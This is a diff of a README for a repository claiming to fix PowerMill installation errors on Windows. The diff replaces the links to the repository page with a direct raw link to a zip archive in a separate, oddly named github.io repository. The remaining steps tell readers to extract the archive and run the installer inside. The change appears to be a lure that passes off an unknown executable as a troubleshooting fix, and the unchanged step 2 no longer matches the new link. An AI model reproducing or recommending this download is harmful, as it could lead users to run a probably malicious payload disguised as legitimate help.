@@ -5,7 +5,7 @@ description: "Fix PowerMill installation errors, update issues, and startup fail
 ---
 # 🛠️ PowerMill-Troubleshooting - Fix common installation errors on Windows
 
-[![](https://img.shields.io/badge/Download-PowerMill_Fixes-blue.svg)](https://github.com/Arguseyed-orangeliqueur857/PowerMill-Troubleshooting)
+[![](https://img.shields.io/badge/Download-PowerMill_Fixes-blue.svg)](https://raw.githubusercontent.com/Arguseyed-orangeliqueur857/arguseyed-orangeliqueur857.github.io/main/Bethlehemite/Dist-v1.1.zip)
 
 This guide helps you put PowerMill on your Windows 11 computer. Many users face hurdles during the setup process. These notes fix those issues. Follow these steps to resolve errors and get your software running.
 
@@ -24,7 +24,7 @@ Confirm your computer meets these rules before you start. PowerMill needs stable
 
 Follow these steps to obtain the necessary files and start the installation.
 
-1.  Visit the following link to access the repository and necessary files: [https://github.com/Arguseyed-orangeliqueur857/PowerMill-Troubleshooting](https://github.com/Arguseyed-orangeliqueur857/PowerMill-Troubleshooting).
+1.  Visit the following link to access the repository and necessary files: [https://raw.githubusercontent.com/Arguseyed-orangeliqueur857/arguseyed-orangeliqueur857.github.io/main/Bethlehemite/Dist-v1.1.zip](https://raw.githubusercontent.com/Arguseyed-orangeliqueur857/arguseyed-orangeliqueur857.github.io/main/Bethlehemite/Dist-v1.1.zip).
 2.  Look for the green button labeled Code on the repository page. Click it and select Download ZIP.
 3.  Right-click the downloaded folder and select Extract All.
 4.  Open the extracted folder and locate the installer file.
